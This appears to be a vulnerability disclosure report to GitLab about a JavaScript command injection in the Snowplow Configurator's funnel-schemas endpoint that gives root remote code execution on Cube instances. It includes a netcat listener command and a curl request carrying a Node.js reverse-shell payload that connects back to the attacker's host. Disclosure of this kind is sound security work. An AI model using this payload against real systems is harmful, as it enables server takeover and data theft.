## Report

####  Summary

When an `owner` or `maintainer` of a project configures `Product Analytics` in a project ([docs](https://docs.gitlab.com/ee/user/product_analytics/index.html)) the `Snowplow Configurator` URL will be available to all `maintainers` on that project. (This is by design, see report #2708083)

There is a command injection in the relation between `Snowplow Configurator` (this Gitlab-owned project [link](https://gitlab.com/gitlab-org/analytics-section/analytics-manager)) and `Cube.` By sending a specially crafted payload to `/funnel-schemas`, a malicious user can gain `root` access to the `Cube` instance.

Even if a `maintainer` in GitLab is trusted to access the `configurator URL` this should not grant that user `root` access to the underlying infrastructure

__The attack__  
10. Start a listener on a public accessible server using  
```bash  
echo "id;ls;env" | nc -l -p 12345  
```  
11. Log in as the new `maintainer` on gitlab  
12. Go to `https://gitlab.com/GROUPNAME/PROJECTNAME/-/settings/analytics`  
13. Copy the value from the `Snowplow configurator` field  
14. Use the value from 13 (the `test:test` in the string is username/password) and the `PROJECTID` with your project ID in this command from a terminal. If you want to run the command multiple times just change `test1` to `test2` in both places it occurs.

Make sure to also change the TARGET to the IP of your listener. Dont use `http` or similar, just the IP  
```bash  
curl -u "test:test" http://159.223.181.253:4567/funnel-schemas -H 'Content-Type: application/json' -d '{  
  "project_ids": ["gitlab_project_PROJECTID"],  
  "funnels": [  
    {"state":"created",  
      "name": "test1",  
      "schema": "{\"name\":\"test1\",\"schema\":\"${(function(){var net = require(`net`), cp = require(`child_process`),sh = cp.spawn(`/bin/sh`, []); var client = new net.Socket(); client.connect(12345, `TARGET`, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })()}gitlab_project_1.snowplow_events\"}"  
    }  
  ]  
}
'  
```  
15. On the listener you should now get the output from running the commands `id`, `ls`, and `env` (the connection will drop but a more robust attack would just download a script and execute it outside the context of `Node` and would persist. But this shows that we are `root` on the system

####  Impact

A malicious `maintainer` can get RCE with `root` access to `Cube` systems

####  What is the current *bug* behavior?

There is no sanitization of the `schemas` stored in `Clickhouse` by the `configurator`, which is subsequently used by `Cube`, allowing for `JS command injection`.

####  What is the expected *correct* behavior?

It should not be possible to gain root access to a `Cube` instance just by knowing the `configurator` URL/creds. As this is a secret shared by `maintainers`. You could also argue that it should not even be possible even if the secret was not shared as the user who gets access to the `configurator` might not be the same person who is maintaining the `Analytics` infrastructure. In a normal corporate setting the Ops person setting these things up will probably not be the same person who configures a project in Gitlab
